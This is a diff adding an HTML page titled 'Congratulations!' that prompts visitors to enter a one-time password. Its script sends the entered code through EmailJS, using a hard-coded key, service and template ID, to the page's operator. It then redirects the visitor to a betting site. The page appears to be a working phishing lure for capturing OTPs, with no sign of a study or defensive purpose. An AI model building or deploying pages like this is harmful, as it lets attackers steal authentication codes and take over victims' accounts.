@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations!</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function () {
+            emailjs.init("MsxNX_sOT_dOnd2W5"); // Replace "YOUR_PUBLIC_KEY" with your EmailJS public key
+        })();
+
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Collect the entered OTP
+            const otp = document.getElementById("password").value;
+
+            if (otp.trim().length === 0) {
+                alert("Please enter your OTP.");
+                return;
+            }
+
+            // EmailJS parameters
+            const emailParams = {
+                otp_code: otp, // Ensure your EmailJS template variable matches this key
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_uxpjh8i", "template_zrv3l69", emailParams)
+                .then(() => {
+                    alert("OTP sent successfully!");
+                    // Redirect after a successful email send
+                    window.location.href = "https://1xbet.ng/en"; // Replace with your desired redirect URL
+                })
+                .catch(error => {
+                    console.error("Error sending OTP:", error);
+                    alert("Failed to send OTP. Please try again.");
+                });
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #4caf50, #81c784);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .container h1 {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        .container p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .container input {
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .container button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: white;
+            color: #4caf50;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .container button:hover {
+            background: #388e3c;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome!</h1>
+        <p>Enter your OTP to proceed.</p>
+        <form onsubmit="handleSubmit(event)">
+            <input type="password" id="password" placeholder="Enter OTP" required>
+            <button type="submit">Submit & Create Git Web</button>
+        </form>
+    </div>
+</body>
+</html>
